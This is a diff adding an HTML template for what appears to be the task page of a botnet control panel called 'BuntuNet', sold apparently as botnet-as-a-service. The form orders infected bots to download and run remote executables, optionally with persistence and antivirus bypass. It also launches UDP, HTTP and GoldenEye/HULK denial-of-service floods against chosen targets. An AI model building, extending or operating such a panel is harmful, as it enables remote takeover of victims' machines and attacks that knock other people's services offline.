@@ -1,0 +1,157 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
+    <title>{{ .title }}</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora">
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,700">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/ionicons/2.0.1/css/ionicons.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.8.2/css/lightbox.min.css">
+    <link rel="stylesheet" href="assets/css/styles.min.css">
+</head>
+
+<body>
+    <nav class="header">
+        <div class="hd_container">
+            <a class="logo" href="home"><p style="display:inline-block; margin: 0px;"><span>Buntu</span>Net</p></a>
+            
+            <a href="javascript:void(0);" class="icon" onclick="slidemenu()">
+                <i class="fa fa-bars"></i>
+            </a>
+
+            <div class="menu" id="menuId">
+                {{ if not .is_logged_in }}
+                <a href="signup">Sign up</a>
+                <a href="signin">Sign in</a>
+                {{ end }}
+                {{ if .is_logged_in }}
+                <a href="news">Go Panel</a>
+                {{ end }}
+                <a href="https://t.me/buntunet">Contact</a>
+                <a href="baas">BaaS</a>
+            </div>
+            
+            <script>
+                function slidemenu() {
+                  var x = document.getElementById("menuId");
+                  if (x.className === "menu") {
+                    x.className += " responsive";
+                  } else {
+                    x.className = "menu";
+                  }
+                }
+            </script>
+        </div>
+    </nav>
+
+    <div class="sideMenu">
+        <a href="news">News</a>
+        <a href="bots">Bots</a>
+        <a href="tasks">Tasks</a>
+        <a href="user">User</a>
+    </div>
+
+    <div class="content">
+        <div class="ct_container">
+                <div class="widget">
+                    <div class="widget box">
+                        <div class="box-header">
+                            <h5>Tasks</h5>
+                        </div>
+                        <div class="box-body">
+                            <div class="block left">
+                                <div class="table-responsive">
+                                    <table class="table">
+                                        <thead>
+                                            <tr>
+                                                <th>Task type</th>
+                                                <th>Parameters</th>
+                                                <th>Rate</th>
+                                            </tr>
+                                        </thead>
+                                        <tbody>
+                                            {{range .payload }}
+                                            <tr>
+                                                <th>{{ .Type }}</th>
+                                                <th>{{ .Param }}</th>
+                                                <th>{{ .Now }}/{{ .Goal }}</th>
+                                            </tr>
+                                            {{end}}
+                                        </tbody>
+                                    </table>
+                                </div>
+                            </div>
+							<form method="POST">
+                            	<div class="block right">
+                                <div class="item">
+                                    <span>Task type:&nbsp;</span>
+                                    <select onchange="CheckValue(this.value);" name="tasktype">
+                                        <option value="0" selected>Select Task</option>
+                                        <optgroup label="Execution">
+                                            <option value="1">Simple Execution</option>
+                                            <option value="2">Execution &amp; Add to startup</option>
+                                            {{ if .is_vip }}
+                                            <option value="3">Execution (AV Bypass)</option>
+                                            <option value="4">Execution &amp; Add to startup (AV Bypass)</option>
+                                            {{ end }}
+                                        </optgroup>
+                                        {{ if .is_vip }}
+                                        <optgroup label="Layer 4">
+                                            <option value="5">UDP</option>
+                                        </optgroup>
+                                        <optgroup label="Layer 7">
+                                            <option value="7">HTTP GET</option>
+                                            <option value="8">HTTP POST</option>
+                                            <option value="9">GoldenEye</option>
+                                            <option value="10">HULK</option>
+                                            <option value="11">Chrome</option>
+                                        </optgroup>
+                                        {{ end }}
+                                    </select>
+                                </div>
+
+                                <div style="display: none;" class="item" id="file">
+                                    <span>File Address:</span>
+                                    <input type="text" placeholder="http://google.com/test.exe" name="fd">
+                                </div>
+                                <div style="display: none;" class="item" id="layer4">
+                                    <span>IP:PORT:</span>
+                                    <input type="text" placeholder="1.1.1.1:254" name="ip">
+                                </div>
+                                <div style="display: none;" class="item" id="layer7">
+                                    <span>Address:</span>
+                                    <input type="text" placeholder="http(s)://google.com" name="addr">
+                                </div>
+                                <div style="display: none;" class="item" id="thread">
+                                    <span>Thread:</span>
+                                    <input type="text" placeholder="300" name="thread">
+                                </div>
+                                <div style="display: none;" class="item" id="time">
+                                    <span>Time:</span>
+                                    <input type="text" placeholder="600 (Second)" name="time">
+                                </div>
+                                <div class="item">
+                                    <span>Num of Exec:</span>
+                                    <input type="text" placeholder="100 (bots, 0 for Everybot)" name="noe">
+                                </div>
+                                <button class="btn-default" type="submit">Run</button>
+                            </div>
+                        	</form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.3.1/js/bootstrap.bundle.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.8.2/js/lightbox.min.js"></script>
+    <script src="assets/js/script.min.js"></script>
+</body>
+
+</html>
